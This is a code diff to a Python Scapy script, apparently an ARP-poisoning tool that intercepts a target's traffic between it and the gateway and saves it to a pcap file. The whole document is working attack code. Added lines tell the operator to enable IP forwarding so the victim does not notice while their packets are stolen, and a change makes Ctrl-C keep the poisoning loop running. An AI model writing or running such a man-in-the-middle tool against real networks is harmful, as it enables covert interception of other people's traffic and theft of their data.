@@ -53,8 +53,7 @@ def restore_target(gateway_ip, gateway_mac, target_ip, target_mac):
         count=5
     )
 
-    # kill this thread Now
-    os.kill(os.getpid(), signal.SIGINT)
+    print "[ * ] Restoration ARPs Sent"
 
 def get_mac(ip_address):
     responses,unanswered = srp(Ether(dst=BROADCAST)/ARP(pdst=ip_address), timeout=2, retry=10)
@@ -78,27 +77,37 @@ def poison_target(gateway_ip, gateway_mac, target_ip, target_mac):
 
     print "[ * ] Beginning the ARP poison. [CTRL-C to stop]"
 
+    sent = 0
     while True:
         try:
+            sent += 1
+            print "Sending %d" % sent
             send(poison_target)
             send(poison_gateway)
 
             time.sleep(2)
         except KeyboardInterrupt:
-            restore_target(gateway_ip, gateway_mac, target_ip, target_mac)
-
+            continue
     print "[ * ] Arp poison attack finished."
     return
 
 
 ##################################### Start of Script #########################
-print "[*] Setting up %s" % interface
+print "[ * ] Hope you remembered to turn ipv4 forwarding on so the user doesn't"
+print "[ * ] recognize a shitty internet connection when you steal their packets"
+print "[ * ] Hint: sudo sysctl -w net.ipv4.ip_forward=1"
+print ""
+print ""
+print "[ * ] Setting up %s" % interface
+
 
 gateway_mac = get_mac_wrapper(gateway_ip, "Gateway")
 target_mac = get_mac_wrapper(target_ip, "Target")
 
 # start poisoning thread
+# Will continue to poison until rest of script executes, hence the daemon flag.
 poison_thread = threading.Thread(target= poison_target, args = (gateway_ip, gateway_mac, target_ip, target_mac))
+poison_thread.daemon = True
 poison_thread.start()
 
 try:
@@ -106,9 +115,11 @@ try:
     bpf_filter = "ip host %s" % target_ip
     packets = sniff(count=packet_count,filter=bpf_filter, iface=interface)
     wrpcap("arper.pcap", packets)
-
+    print "[ * ] Done Sniffing for packets"
 except KeyboardInterrupt:
     pass
-
-# restore the network
-restore_target(gateway_ip, gateway_mac, target_ip, target_mac)
+finally:
+    # restore the network
+    restore_target(gateway_ip, gateway_mac, target_ip, target_mac)
+    sys.exit(0)
+    print "[ * ] Done."
